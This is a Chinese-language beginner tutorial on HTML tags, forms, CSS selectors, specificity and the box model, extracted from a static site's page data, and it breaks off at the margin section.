部分",slug:"head-部分"},{level:2,title:"语义化",slug:"语义化"},{level:2,title:"<p>",slug:"p"},{level:2,title:"<hx>",slug:"hx"},{level:2,title:"<strong>/<em>",slug:"strong-em"},{level:2,title:"<em>、、<span>的区别：",slug:"em-、-strong-、-span-的区别"},{level:2,title:"<q>/<blockquote>",slug:"q-blockquote"},{level:3,title:"q标签，短文本引用",slug:"q标签-短文本引用"},{level:3,title:"blockquote标签，长文本引用",slug:"blockquote标签-长文本引用"},{level:2,title:"<br/>",slug:"br"},{level:2,title:"<hr/>",slug:"hr"},{level:2,title:"&nbsp;",slug:"nbsp"},{level:2,title:"<address>",slug:"address"},{level:2,title:"<code>",slug:"code"},{level:2,title:"无序列表",slug:"无序列表"},{level:2,title:"有序列表",slug:"有序列表"},{level:2,title:"<div>容器标签",slug:"div-容器标签"},{level:2,title:"创建表格",slug:"创建表格"},{level:2,title:"超链接",slug:"超链接"},{level:2,title:"网页插入图片",slug:"网页插入图片"},{level:2,title:"<form>",slug:"form"},{level:2,title:"<input>",slug:"input"},{level:2,title:"<textarea>",slug:"textarea"},{level:2,title:"单选框，复选框",slug:"单选框-复选框"},{level:2,title:"<select>",slug:"select"},{level:2,title:"下拉列表框进行多选",slug:"下拉列表框进行多选"},{level:2,title:"提交按钮",slug:"提交按钮"},{level:2,title:"重置按钮",slug:"重置按钮"},{level:2,title:"认识css样式",slug:"认识css样式"},{level:2,title:"CSS代码语法",slug:"css代码语法"},{level:2,title:"插入形式",slug:"插入形式"},{level:2,title:"标签选择器",slug:"标签选择器"},{level:2,title:"类选择器",slug:"类选择器"},{level:2,title:"ID选择器",slug:"id选择器"},{level:2,title:"类和ID选择器的区别",slug:"类和id选择器的区别"},{level:2,title:"子选择器",slug:"子选择器"},{level:2,title:"包含(后代)选择器",slug:"包含-后代-选择器"},{level:2,title:"伪类选择符",slug:"伪类选择符"},{level:2,title:"分组选择符",slug:"分组选择符"},{level:2,title:"继承",slug:"继承"},{level:2,title:"权值",slug:"权值"},{level:2,title:"层叠",slug:"层叠"},{level:2,title:"重要性",slug:"重要性"},{level:2,title:"文字排版",slug:"文字排版"},{level:2,title:"段落排版",slug:"段落排版"},{level:2,title:"元素分类",slug:"元素分类"},{level:2,title:"元素分类--块级元素",slug:"元素分类-块级元素"},{level:2,title:"元素分类--行内元素",slug:"元素分类-行内元素"},{level:2,title:"元素分类--内联块状元素",slug:"元素分类-内联块状元素"},{level:2,title:"盒模型--边框（一）",slug:"盒模型-边框-一"},{level:2,title:"盒模型--边框（二）",slug:"盒模型-边框-二"},{level:2,title:"盒模型--边界",slug:"盒模型-边界"},{level:2,title:"盒模型--填充",slug:"盒模型-填充"},{level:2,title:"盒模型代码简写",slug:"盒模型代码简写"},{level:2,title:"颜色值缩写",slug:"颜色值缩写"},{level:2,title:"css布局模型",slug:"css布局模型-2"},{level:2,title:"流动模型",slug:"流动模型"},{level:2,title:"浮动模型",slug:"浮动模型"},{level:2,title:"层模型",slug:"层模型"},{level:3,title:"层模型--绝对定位（相对于父类）",slug:"层模型-绝对定位-相对于父类"},{level:3,title:"层模型--相对定位（相对于以前）",slug:"层模型-相对定位-相对于以前"},{level:3,title:"层模型--固定定位（相对于网页窗口）",slug:"层模型-固定定位-相对于网页窗口"},{level:2,title:"Relative与Absolute组合使用",slug:"relative与absolute组合使用"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' html+css基础 \n Html和CSS的关系 \n 学习web前端开发基础技术需要掌握：HTML、CSS、JavaScript语言。下面我们就来了解下这三门技术都是用来实现什么的： \n \n \n HTML是网页内容的载体。内容就是网页制作者放在页面上想要让用户浏览的信息，可以包含文字、图片、视频等。 \n \n \n CSS样式是表现。就像网页的外衣。比如，标题字体、颜色变化，或为标题加入背景图片、边框等。所有这些用来改变内容外观的东西称之为表现。 \n \n \n JavaScript是用来实现网页上的特效效果。如：鼠标滑过弹出下拉菜单。或鼠标滑过表格的背景颜色改变。还有焦点新闻（新闻图片）的轮换。可以这么理解，有动画的，有交互的一般都是用JavaScript来实现的。 \n 标签大小写 \n \n HTML标签不区分大小写， <h1>和<H1> 是一样的，但建议小写，因为大部分程序员都以小写为准。 \n 固定的结构 \n 一个HTML文件是有自己固定的结构的。 \n < html > \n     < head > ... </ head > \n     < body > ... </ body > \n </ html > \n \n 1 2 3 4 代码讲解： \n \n <html></html> 称为根标签，所有的网页标签都在 <html> ... </html> 中。 \n <head>  标签用于定义文档的头部，它是所有头部元素的容器。头部元素有 <title>、<script>、 <style>、<link>、 <meta> 等标签，头部标签在下一小节中会有详细介绍。 \n 在 <body> 和 </body> 标签之间的内容是网页的主要内容，如 <h1>、<p>、<a>、<img> 等网页内容标签，在这里的标签中的内容会在浏览器中显示出来。 \n head 部分 \n \n 下面这些标签可用在 head 部分： \n \n < head > \n     < title > ... </ title > \n     < meta > \n     < link > \n     < style > ... </ style > \n     < script > ... </ script > \n </ head > \n \n 1 2 3 4 5 6 7 \n 代码注释不仅方便程序员自己回忆起以前代码的用途，还可以帮助其他程序员很快的读懂你的程序的功能，方便多人合作开发网页代码。 \n \n 语法： \n \n \n CSS注释代码 \n \n 就像在Html的注释一样，在CSS中也有注释语句：用/ 注释语句 /来标明（Html中使用 ) \n 语义化 \n \n \n 语义化：说的通俗点就是：明白每个标签的用途（在什么情况下我可以使用这个标签才合理）比如，网页上的文章的标题就得用标题标签，网页上的各个栏目的栏目名称也可以使用标题标签。 \n \n \n 语义化的作用 \n \n \n \n \n 更容易被搜索引擎收录。 \n \n \n 更容易让屏幕阅读器读出网页内容。 \n 认识标签（第一部分） \n  <p> \n 如果想在网页上显示文章，这时就需要 <p> 标签了，把文章的段落放到 <p> 标签中。 \n 语法： \n < p > 段落文本 </ p > \n \n 1 #   <hx> \n 标题标签一共有6个，h1、h2、h3、h4、h5、h6分别为一级标题、二级标题、三级标题、四级标题、五级标题、六级标题。并且依据重要性递减。 <h1> 是最高的等级。 \n 语法： \n < hx > 标题文本 </ hx > (x为1-6)\n \n 1 文章的标题前面已经说过了，可以使用标题标签，另外网页上的各个栏目的标题也可使用它们 \n  <strong>/<em> \n 有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到 <em> 或 <strong> 标签。 \n 但两者在强调的语气上有区别: <em>  表示强调， <strong>  表示更强烈的强调。并且在浏览器中 <em>  默认用斜体表示， <strong>  用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用 <strong> 表示强调 \n  <em>、<strong>、<span> 的区别： \n \n \n <em> 和 <strong> 标签是为了强调一段话中的关键字时使用，它们的语义是强调。 \n \n \n <span> 标签是没有语义的，它的作用就是为了设置单独的样式用的，把一段话圈起来，然后用css设置样式。 \n  <q>/<blockquote> \n q标签，短文本引用 \n 比如在你的网页的文章里想引用某个作家的一句诗，这样会使你的文章更加出彩，那么 标签是你所需要的。\n语法： \n < q > 引用文本 </ q > \n \n 1 \n \n 注意要引用的文本不用加双引号，浏览器会对q标签自动添加双引号。 \n \n \n 注意这里用 <q> 标签的真正关键点不是它的默认样式双引号（如果这样我们不如自己在键盘上输入双引号就行了），而是它的语义：引用别人的话 \n blockquote标签，长文本引用 \n <blockquote> 的作用也是引用别人的文本。但它是对长文本的引用 \n <q> 标签是对简短文本的引用，比如说引用一句话就用到 <q> 标签。 \n 语法: \n < blockquote > 引用文本 </ blockquote > \n \n 1 浏览器对 <blockquote> 标签的解析是缩进样式 \n  <br/> \n 换行标签 <br/> \n 标签作用相当于word文档中的回车。只有一个开始标签，没有结束标签。 \n  <hr/> \n 分割线标签 <hr/> \n <hr/> 标签的在浏览器中的默认样式线条比较粗，颜色为灰色 \n  &nbsp; \n html特殊字符 \n 空格： &nbsp; (;分号必不可少) \n  <address> \n address标签，为网页加入地址信息 \n 语法： \n < address > 地址信息 </ address > \n \n 1 如： \n <address> 北京市西城区德外大街10号 </address> \n 在浏览器上显示的样式为斜体，如果不喜欢斜体，当然可以，可以在后面的课程中使用css样式来修改它 <address> 标签的默认样式 \n  <code> \n 在介绍语言技术的网站中，必免不了在网页中显示一些计算机专业的编程代码，当代码为一行代码时，你就可以使用 <code> 标签了，如下面例子： \n < code > var i=i+300; </ code > \n \n 1 语法： \n < code > 代码语言 </ code > \n \n 1 注意：在文章中一般如果要插入多行代码时不能使用 <code> 标签，如果是多行代码，可以使用 <pre> 标签。 \n <pre>  标签的主要作用:预格式化的文本。被包围在 pre 元素中的文本通常会保留空格和换行符。如果用以前的方法，回车需要输入 <br> 签，空格需要输入 &nbsp; 。 \n 注意： <pre> 标签不只是为显示计算机的源代码时用的，在你需要在网页中预显示格式时都可以使用它，只是 <pre> 标签的一个常见应用就是用来展示计算机的源代码。 \n 认识标签（第二部分） \n 无序列表 \n ul-li是没有前后顺序的信息列表。 \n 语法： \n < ul > \n     < li > 信息 </ li > \n     < li > 信息 </ li > \n    ......\n </ ul > \n \n 1 2 3 4 5 举例： \n < ul > \n     < li > 精彩少年 </ li > \n     < li > 美丽突然出现 </ li > \n     < li > 触动心灵的旋律 </ li > \n </ ul > \n \n 1 2 3 4 5 ul-li在网页中显示的默认样式一般为：每项li前都自带一个圆点 \n 有序列表 \n 语法： \n < ol > \n     < li > 信息 </ li > \n     < li > 信息 </ li > \n    ......\n </ ol > \n \n 1 2 3 4 5 举例： \n 下面是一个热点课程下载排行榜： \n <ol>\n    <li>前端开发面试心法 </li>\n    <li>零基础学习html</li>\n    <li>JavaScript全攻略</li>\n</ol>\n \n 1 2 3 4 5 <ol> 在网页中显示的默认样式一般为：每项 <li> 前都自带一个序号，序号默认从1开始 \n  <div> 容器标签 \n 在网页制作过程过中，可以把一些独立的逻辑部分划分出来，放在一个 <div> 标签中，这个 <div> 标签的作用就相当于一个容器。 \n 语法： \n < div > … </ div > \n \n 1 确定逻辑部分： \n 什么是逻辑部分？它是页面上相互关联的一组元素。如网页中的独立的栏目版块，就是一个典型的逻辑部分。如下图所示：图中用红色边框标出的部分就是一个逻辑部分，就可以使用 <div> 标签作为容器 \n 注释： <div>  是一个块级元素，也就是说，浏览器通常会在 div 元素前后放置一个换行符。 \n 创建表格 \n 创建表格的五个元素： \n table、tbody、tr、th、td \n \n \n <table>…</table> ：整个表格以 <table> 标记开始、 </table> 标记结束。 \n \n \n <tbody>…</tbody> ：当表格内容非常多时，表格会下载一点显示一点，但如果加上 <tbody> 标签后，这个表格就要等表格内容全部下载完才会显示。如右侧代码编辑器中的代码。（这个标签基本上不怎么用了） \n \n \n <tr>…</tr> ：表格的一行，所以有几对tr 表格就有几行。 \n \n \n <td>…</td> ：表格的一个单元格，一行中包含几对 <td>...<td/> ，说明一行中就有几列。 \n \n \n <th>…</th> ：表格的头部的一个单元格，表格表头。 \n \n \n 表格中列的个数，取决于一行中数据单元格的个数。 \n \n \n 表格还是需要添加一些标签进行优化，可以添加标题和摘要 \n <table summary="本表格记录2012年到2013年库存记录，记录包括U盘和耳机库存量"> \n <caption>2012年到2013年库存记录</caption> \n 超链接 \n 使用 <a> 标签，链接到别一个页面 \n 使用 <a> 标签可实现超链接，它在网页制作中可以说是无处不在，只要有链接的地方，就会有这个标签。 \n 语法： \n < a   href   =   " 目标网址 " > 链接显示的文本 </ a > \n \n 1 例如： \n < a   href   =   " http://www.imooc.com " > click here! </ a > \n \n 1 上面例子作用是单击click here!文字，网页链接到 慕课网 这个网页。 \n 网页插入图片 \n 认识 <img> 标签，为网页插入图片 \n 在网页的制作中为使网页炫丽美观，肯定是缺少不了图片，可以使用 <img> 标签来插入图片。 \n 语法： \n < img   src = " 图片地址 "   alt = " 下载失败时的替换文本 "   title   =   " 提示文本 " > \n \n 1 举例： \n < img   src   =   " myimage.gif "   alt   =   " My Image "   title   =   " My Image "   /> \n \n 1 讲解： \n \n \n src：标识图像的位置； \n \n \n alt：指定图像的描述性文本，当图像不可见时（下载不成功时），可看到该属性指定的文本； \n \n \n title：提供在图像可见时对图像的描述(鼠标滑过图片时显示的文本)； \n \n \n 图像可以是GIF，PNG，JPEG格式的图像文件。 \n 表单标签（与用户进行交互） \n  <form> \n 表单是可以把浏览者输入的数据传送到服务器端，这样服务器端程序就可以处理表单传过来的数据。 \n 语法： \n < form   method = " 传送方式 "   action = " 服务器文件 " > \n \n 1 讲解： \n \n \n <form>  ： <form> 标签是成对出现的，以 <form> 开始，以 </form> 结束。 \n \n \n action ：浏览者输入的数据被传送到的地方,比如一个PHP页面(save.php)。 \n \n \n method ： 数据传送的方式（get/post）。 \n  <input> \n <input> 输入框 \n 文本输入框、密码输入框 \n 当用户要在表单中键入字母、数字等内容时，就会用到文本输入框。文本框也可以转化为密码输入框。 \n 语法： \n < form > \n     < input   type = " text/password "   name = " 名称 "   value = " 文本 "   /> \n </ form > \n \n 1 2 3 \n type： \n \n 当type="text"时，输入框为文本输入框; \n 当type="password"时, 输入框为密码输入框。 \n \n \n name：为文本框命名，以备后台程序ASP 、PHP使用。 \n \n \n value：为文本输入框设置默认值。(一般起到提示作用) \n  <textarea> \n 文本域，支持多行文本输入 \n 当用户需要在表单中输入大段文字时，需要用到文本输入域。 \n 语法： \n < textarea   rows = " 行数 "   cols = " 列数 " > 文本 </ textarea > \n \n 1 \n \n <textarea> 标签是成对出现的，以 <textarea> 开始，以 </textarea> 结束。 \n \n \n cols ：多行输入域的列数。 \n \n \n rows ：多行输入域的行数。 \n 单选框，复选框 \n 单选框，复选框 \n 语法： \n < input   type = " radio/checkbox "   value = " 值 "   name = " 名称 "   checked = " checked " /> \n \n 1 \n \n type: \n 当type="radio"时，控件为单选框 \n 当type="checkbox"时，控件为复选框 \n \n \n value：提交数据到服务器的值（后台程序PHP使用） \n \n \n name：为控件命名，以备后台程序ASP、PHP使用 \n \n \n checked：当设置checked="checked"时，该选项被默认选中 \n \n \n 注意：同一组的单选按钮，name取值一定要一致，这样同一组的单选按钮才可以起到单选的作用。 \n  <select> \n 下拉列表框，节省空间 \n 下拉列表在网页中也常会用到，它可以有效的节省网页空间。既可以单选、又可以多选。 \n 语法： \n < option   value = " 提交值 " > 选项 </ option > \n \n 1 提交值是向服务器提交的值，选项是显示的值。 \n < form   action = " save.php "   method = " post "   > \n     < label > 爱好: </ label > \n     < select > \n         < option   value = " 看书 " > 看书 </ option > \n         < option   value = " 旅游 "   selected = " selected " > 旅游 </ option > \n         < option   value = " 运动 " > 运动 </ option > \n         < option   value = " 购物 " > 购物 </ option > \n     </ select > \n </ form > \n \n 1 2 3 4 5 6 7 8 9 #  下拉列表框进行多选 \n 使用下拉列表框进行多选 \n 下拉列表也可以进行多选操作，在 <select> 标签中设置 multiple="multiple" 属性， \n 就可以实现多选功能，进行多选时按下Ctrl键同时进行单击，可以选择多个选项。 \n 如下代码： \n < form   action = " save.php "   method = " post "   > \n     < label > 爱好: </ label > \n     < select   multiple = " multiple " > \n         < option   value = " 看书 " > 看书 </ option > \n         < option   value = " 旅游 " > 旅游 </ option > \n         < option   value = " 运动 " > 运动 </ option > \n         < option   value = " 购物 " > 购物 </ option > \n     </ select > \n </ form > \n \n 1 2 3 4 5 6 7 8 9 #  提交按钮 \n 提交按钮：当用户需要提交表单信息到服务器时，需要用到提交按钮。 \n 语法： \n < input   type = " submit "   value = " 提交 " > \n \n 1 \n \n type：只有当type值设置为submit时，按钮才有提交作用 \n \n \n value：按钮上显示的文字 \n 重置按钮 \n 重置按钮，重置表单信息 \n 当用户需要重置表单信息到初始时的状态时，比如用户输入“用户名”后，发现书写有误，可以使用重置按钮使输入框恢复到初始状态。只需要把type设置为"reset"就可以。 \n 语法： \n < input   type = " reset "   value = " 重置 " > \n \n 1 \n \n type：只有当type值设置为reset时，按钮才有重置作用 \n \n \n value：按钮上显示的文字 \n css样式 \n 认识css样式 \n CSS全称为“层叠样式表 (Cascading Style Sheets)”，它主要是用于定义HTML内容在浏览器内的显示样式，如文字大小、颜色、字体加粗等。 \n 如下列代码： \n p { \n     font-size : 12px ; \n     color : red ; \n     font-weight : bold ; \n } \n \n 1 2 3 4 5 使用CSS样式的一个好处是通过定义某个样式，可以让不同网页位置的文字有着统一的字体、字号或者颜色等。 \n CSS代码语法 \n css 样式由选择符和声明组成，而声明又由属性和值组成 \n 选择符{属性:值} \n p { color : red ; } \n \n 1 选择符：又称选择器，指明网页中要应用样式规则的元素，如本例中是网页中所有的段（p）的文字将变成蓝色，而其他的元素（如ol）不会受到影响。 \n 声明：在英文大括号“｛｝”中的的就是声明，属性和值之间用英文冒号“：”分隔。当有多条声明时，中间可以英文分号“;”分隔，如下所示： \n p { font-size : 12px ; color : red ; } \n \n 1 #  插入形式 \n 从CSS 样式代码插入的形式来看基本可以分为以下3种： \n 内联式、嵌入式和外部式三种 \n \n 内联式css样式 \n \n 就是把css代码直接写在现有的HTML标签中，如下面代码： \n <p style= "color:red" >这里文字是红色。</p>\n \n 1 css样式代码要写在style=""双引号中，如果有多条css样式代码设置可以写在一起，中间用分号隔开。如下代码： \n <p style= "color:red;font-size:12px" >这里文字是红色。</p>\n \n 1 \n 嵌入式css样式， \n \n 就是可以把css样式代码写在 <style type="text/css"></style> 标签之间。如下面代码实现把三个 <span> 标签中的文字设置为红色： \n <style type="text/css">\nspan { \n     color : red ; \n } \n</style>\n \n 1 2 3 4 5 嵌入式css样式必须写在 <style></style> 之间，并且一般情况下嵌入式css样式写在 <head></head> 之间。 \n \n 外部式css样式 \n \n 写在单独的一个文件中 \n 外部式css样式(也可称为外联式)就是把css代码写一个单独的外部文件中，这个css样式文件以“.css”为扩展名，在 <head> 内（不是在 <style> 标签内）使用 <link> 标签将css样式文件链接到HTML文件内，如下面代码： \n < link   href = " base.css "   rel = " stylesheet "   type = " text/css "   /> \n \n 1 注意： \n \n \n css样式文件名称以有意义的英文字母命名，如 main.css。 \n \n \n rel="stylesheet" type="text/css"  是固定写法不可修改。 \n \n \n <link> 标签位置一般写在 <head> 标签之内。 \n CSS选择器 \n 每一条css样式定义由两部分组成，形式如下： \n 选择器{ \n 样式; \n } \n 在{}之前的部分就是“选择器”，“选择器”指明了{}中的“样式”的作用对象，也就是“样式”作用于网页中的哪些元素 \n 标签选择器 \n 标签选择器其实就是html代码中的标签。如右侧代码编辑器中的 <html>、<body>、<h1>、<p>、<img> 。例如下面代码： \n p { font-size : 12px ; line-height : 1.6em ; } \n \n 1 上面的css样式代码的作用：为p标签设置12px字号，行间距设置1.6em的样式。 \n 类选择器 \n 类选择器在css样式编码中是最常用到的，如右侧代码编辑器中的代码:可以实现为“胆小如鼠”、“勇气”字体设置为红色。 \n 语法： \n .类选器名称{css样式代码;} \n 注意： \n \n \n 英文圆点开头 \n \n \n 其中类选器名称可以任意起名（但不要起中文噢） \n \n \n 使用方法： \n 第一步：使用合适的标签把要修饰的内容标记起来，如下： \n < span > 胆小如鼠 </ span > \n \n 1 第二步：使用class="类选择器名称"为标签设置一个类，如下： \n < span   class = " stress " > 胆小如鼠 </ span > \n \n 1 第三步：设置类选器css样式，如下： \n .stress { color : red ; } /*类前面要加入一个英文圆点*/ \n \n 1 #  ID选择器 \n 在很多方面，ID选择器都类似于类选择符，但也有一些重要的区别： \n \n \n 为标签设置id="ID名称"，而不是class="类名称"。 \n \n \n ID选择符的前面是井号（#）号，而不是英文圆点（.）。 \n 类和ID选择器的区别 \n 相同点：可以应用于任何元素 \n 不同点： \n \n ID选择器只能在文档中使用一次。与类选择器不同，在一个HTML文档中，ID选择器只能使用一次，而且仅一次。而类选择器可以使用多次。 \n \n 下面代码是正确的： \n < p > 三年级时，我还是一个 < span   class = " stress " > 胆小如鼠 </ span > 的小女孩，上课从来不敢回答老师提出的问题，生怕回答错了老师会批评我。就一直没有这个 < span   class = " stress " > 勇气 </ span > 来回答老师提出的问题。 </ p > \n \n 1 而下面代码是错误的： \n < p > 三年级时，我还是一个 < span   id = " stress " > 胆小如鼠 </ span > 的小女孩，上课从来不敢回答老师提出的问题，生怕回答错了老师会批评我。就一直没有这个 < span   id = " stress " > 勇气 </ span > 来回答老师提出的问题。 </ p > \n \n 1 \n 可以使用类选择器词列表方法为一个元素同时设置多个样式。我们可以为一个元素同时设多个样式，但只可以用类选择器的方法实现，ID选择器是不可以的（不能使用 ID 词列表）。 \n \n 下面的代码是正确的(完整代码见右侧代码编辑器) \n .stress { \n     color : red\n } \n .bigsize { \n     font-size : 25px ; \n } \n \n 1 2 3 4 5 6 < p > 到了 < span   class = " stress bigsize " > 三年级 </ span > 下学期时，我们班上了一节公开课... </ p > \n \n 1 上面代码的作用是为“三年级”三个文字设置文本颜色为红色并且字号为25px \n 下面的代码是不正确的(完整代码见右侧代码编辑器) \n #stressid { \n     color : red ; \n } \n\n #bigsizeid { \n     font-size : 25px ; \n } \n \n 1 2 3 4 5 6 7 < p > 到了 < span   id = " stressid bigsizeid " > 三年级 </ span > 下学期时，我们班上了一节公开课... </ p > \n \n 1 上面代码不可以实现为“三年级”三个文字设置文本颜色为红色并且字号为25px的作用。 \n 子选择器 \n 还有一个比较有用的选择器子选择器，即大于符号(>),用于选择指定标签元素的子元素。如下面的代码： \n .food>li { border : 1px solid red ; } \n \n 1 这行代码会使class名为food下的子元素li加入红色实线边框。 \n 包含(后代)选择器 \n 包含选择器，即加入空格,用于选择指定标签元素下的后辈元素。如右侧代码编辑器中的代码： \n .first span { color : red ; } \n \n 1 请注意这个选择器与子选择器的区别 \n \n \n 子选择器（child selector）仅是指它的直接后代，或者你可以理解为作用于子元素的第一代后代 \n \n \n 后代选择器是作用于所有子后代元素。后代选择器通过空格来进行选择，而子选择器是通过“>”进行选择。 \n \n \n 总结：>作用于元素的第一代后代，空格作用于元素的所有后代。 \n 通用选择器 \n 通用选择器是功能最强大的选择器，它使用一个（*）号指定，它的作用是匹配html中任意标签元素，如下使用下面代码使用html中任意标签元素字体颜色全部设置为红色： \n *   { color : red ; } \n \n 1 #  伪类选择符 \n 更有趣的是伪类选择符，为什么叫做伪类选择符，它允许给html不存在的标签设置样式，比如说我们给html中一个标签元素的鼠标滑过的状态来设置字体颜色： \n a:hover { color : red ; } \n \n 1 这行代码会使被 <a></a> 标签包裹的文字内容中的“胆小如鼠”字体颜色在鼠标滑过时变为红色。 \n 分组选择符 \n 当你想为html中多个标签元素设置同一个样式时，可以使用分组选择符（，），如下代码为右侧代码编辑器中的h1、span标签同时设置字体颜色为红色： \n h1,span { color : red ; } \n \n 1 它相当于下面两行代码： \n h1 { color : red ; } \n\n span { color : red ; } \n \n 1 2 3 #  CSS的继承、层叠和特殊性。 \n 继承 \n CSS的某些样式是具有继承性的，那么什么是继承呢？继承是一种规则，它允许样式不仅应用于某个特定html标签元素，而且应用于其后代。比如下面代码：如某种颜色应用于p标签，这个颜色设置不仅应用p标签，还应用于p标签中的所有子元素文本，这里子元素为span标签。 \n 但注意有一些css样式是不具有继承性的。如border:1px solid red; \n 权值 \n 根据权值来判断使用哪个css样式 \n 浏览器是根据权值来判断使用哪种css样式的，权值高的就使用哪种css样式。 \n 下面是权值的规则： \n 标签的权值为1，类选择符的权值为10，ID选择符的权值最高为100。例如下面的代码： \n p { color : red ; }   /*权值为1*/ \n\n p span { color : green ; }   /*权值为1+1=2*/ \n\n .warning { color : white ; }   /*权值为10*/ \n\n p span.warning { color : purple ; }   /*权值为1+1+10=12*/ \n\n #footer .note p { color : yellow ; }   /*权值为100+10+1=111*/ \n \n 1 2 3 4 5 6 7 8 9 注意：还有一个权值比较特殊--继承也有权值但很低，有的文献提出它只有0.1，所以可以理解为继承的权值最低 \n 层叠 \n 我们来思考一个问题：如果在html文件中对于同一个元素可以有多个css样式存在并且这多个css样式具有相同权重值怎么办？好，这一小节中的层叠帮你解决这个问题。 \n 层叠就是在html文件中对于同一个元素可以有多个css样式存在，当有相同权重的样式存在时，会根据这些css样式的前后顺序来决定，处于最后面的css样式会被应用。 \n 如下面代码: \n p { color : red ; } \n\n p { color : green ; } \n\n<p class= "first" >三年级时，我还是一个<span>胆小如鼠</span>的小女孩。</p>\n \n 1 2 3 4 5 最后 p 中的文本会设置为green，这个层叠很好理解，理解为后面的样式会覆盖前面的样式。 \n 所以前面的css样式优先级就不难理解了： \n 内联样式表（标签内部）> 嵌入样式表（当前文件中）> 外部样式表（外部文件中）。 \n 重要性 \n 重要性 \n 我们在做网页代码的时，有些特殊的情况需要为某些样式设置具有最高权值，怎么办？这时候我们可以使用!important来解决。 \n 如下代码： \n p { color : red !important ; } \n\n p { color : green ; } \n\n<p class= "first" >三年级时，我还是一个<span>胆小如鼠</span>的小女孩。</p>\n \n 1 2 3 4 5 这时 p 段落中的文本会显示的red红色。 \n 注意：!important要写在分号的前面 \n CSS格式化排版 \n 文字排版 \n \n 文字排版--字体 \n \n 我们可以使用css样式为网页中的文字设置字体、字号、颜色等样式属性。下面我们来看一个例子，下面代码实现：为网页中的文字设置字体为宋体。 \n body { font-family : "宋体" ; } \n \n 1 这里注意不要设置不常用的字体，因为如果用户本地电脑上如果没有安装你设置的字体，就会显示浏览器默认的字体。（因为用户是否可以看到你设置的字体样式取决于用户本地电脑上是否安装你设置的字体。） \n \n 文字排版--字号、颜色 \n \n 可以使用下面代码设置网页中文字的字号为12像素，并把字体颜色设置为#666(灰色)： \n body { font-size : 12px ; color : #666 } \n \n 1 \n 文字排版--粗体 \n \n 我们还可以使用css样式来改变文字的样式：粗体、斜体、下划线、删除线，可以使用下面代码实现设置文字以粗体样式显示出来。 \n p span { font-weight : bold ; } \n \n 1 \n 文字排版--斜体 \n \n 以下代码可以实现文字以斜体样式在浏览器中显示： \n p a { font-style : italic ; } \n\n<p>三年级时，我还是一个<a>胆小如鼠</a>的小女孩。</p>\n \n 1 2 3 \n 文字排版--下划线 \n \n 有些情况下想为文字设置为下划线样式，这样可以在视觉上强调文字，可以使用下面代码来实现： \n p a { text-decoration : underline ; } \n\n<p>三年级时，我还是一个<a>胆小如鼠</a>的小女孩。</p>\n \n 1 2 3 删除线，在电商网站上经常见。 \n p a { text-decoration : line-through ; } \n \n 1 #  段落排版 \n \n 段落排版--缩进 \n \n 中文文字中的段前习惯空两个文字的空白，这个特殊的样式可以用下面代码来实现： \n p { text-indent : 2em ; } \n \n 1 注意：2em的意思就是文字的2倍大小。 \n \n 段落排版--行间距 \n \n 这一小节我们来学习一下另一个在段落排版中起重要作用的行间距属性（line-height），如下代码实现设置段落行间距为1.5倍。 \n p { line-height : 1.5em ; } \n \n 1 \n 段落排版--字间距、字母间距 \n \n 文字间隔、字母间隔设置： \n 如果想在网页排版中设置文字间隔或者字母间隔就可以使用 letter-spacing来实现，如下面代码： \n h1 { \n     letter-spacing : 50px ; \n } \n\n...\n\n<h1>了不起的盖茨比</h1>\n \n 1 2 3 4 5 6 7 注意：这个样式使用在英文单词时，是设置字母与字母之间的间距。 \n 单词间距设置： \n 如果我想设置英文单词之间的间距呢？可以使用word-spacing来实现。如下代码： \n h1 { \n     word-spacing : 50px ; \n } \n...\n<h1>welcome to imooc!</h1>\n \n 1 2 3 4 5 #  CSS盒模型 \n 元素分类 \n 在讲解CSS布局之前，我们需要提前知道一些知识，在CSS中，html中的标签元素大体被分为三种不同的类型：块状元素、内联元素和内联块状元素。 \n 常用的块状元素有： \n <div>、<p>、<h1>...<h6>、<ol>、<ul>、<dl>、<table>、<address>、<blockquote> 、<form> \n 常用的内联元素有： \n <a>、<span>、<br>、<i>、<em>、<strong>、<label>、<q>、<var>、<cite>、<code> \n 常用的内联块状元素有： \n <img>、<input> \n 元素分类--块级元素 \n 什么是块级元素？在html中 <div>、 <p>、<h1>、<form>、<ul>  和  <li> 就是块级元素。设置display:block就是将元素显示为块级元素。如下代码就是将行内元素a转换为块状元素，从页使用a元素具有块状元素特点。 \n a { display : block ; } \n \n 1 块级元素特点： \n \n \n 每个块级元素都从新的一行开始，并且其后的元素也另起一行。（真霸道，一个块级元素独占一行） \n \n \n 元素的高度、宽度、行高以及顶和底边距都可设置。 \n \n \n 元素宽度在不设置的情况下，是它本身父容器的100%（和父元素的宽度一致），除非设定一个宽度。 \n 元素分类--行内元素 \n 在html中， <span>、<a>、<label>、<input>、 <img> 、  <strong>  和 <em> 就是典型的行内元素（inline）元素。当然块状元素也可以通过代码display:inline将元素设置为行内元素。 \n 行内元素特点： \n \n \n 和其他元素都在一行上； \n \n \n 元素的高度、宽度、行高及顶部和底部边距不可设置； \n \n \n 元素的宽度就是它包含的文字或图片的宽度，不可改变。 \n 元素分类--内联块状元素 \n 内联块状元素（inline-block）就是同时具备内联元素、块状元素的特点，代码display:inline-block就是将元素设置为内联块状元素。(css2.1新增)， <img>、<input> 标签就是这种内联块状标签。 \n inline-block元素特点： \n \n \n 和其他元素都在一行上； \n \n \n 元素的高度、宽度、行高以及顶和底边距都可设置。 \n 盒模型--边框（一） \n 盒子模型的边框就是围绕着内容及补白的线，这条线你可以设置它的粗细、样式和颜色(边框三个属性)。 \n 如下面代码为div来设置边框粗细为2px、样式为实心的、颜色为红色的边框： \n div { \n     border : 2px solid red ; \n } \n \n 1 2 3 上面是border代码的缩写形式，可以分开写： \n div { \n     border-width : 2px ; \n     border-style : solid ; \n     border-color : red ; \n } \n \n 1 2 3 4 5 注意： \n \n border-style（边框样式）常见样式有： \n \n dashed（虚线）| dotted（点线）| solid（实线）。 \n \n border-color（边框颜色）中的颜色可设置为十六进制颜色，如: \n \n border-color:#888;//前面的井号不要忘掉。 \n 盒模型--边框（二） \n 现在有一个问题，如果有想为p标签单独设置下边框，而其它三边都不设置边框样式怎么办呢？css样式中允许只为一个方向的边框设置样式： \n div { border-bottom : 1px solid red ; } \n \n 1 同样可以使用下面代码实现其它三边上、右、左边框的设置： \n border-top : 1px solid red ; \n\n border-right : 1px solid red ; \n\n border-left : 1px solid red ; \n···\n \n 1 2 3 4 5 6 #  盒模型--边界 \n 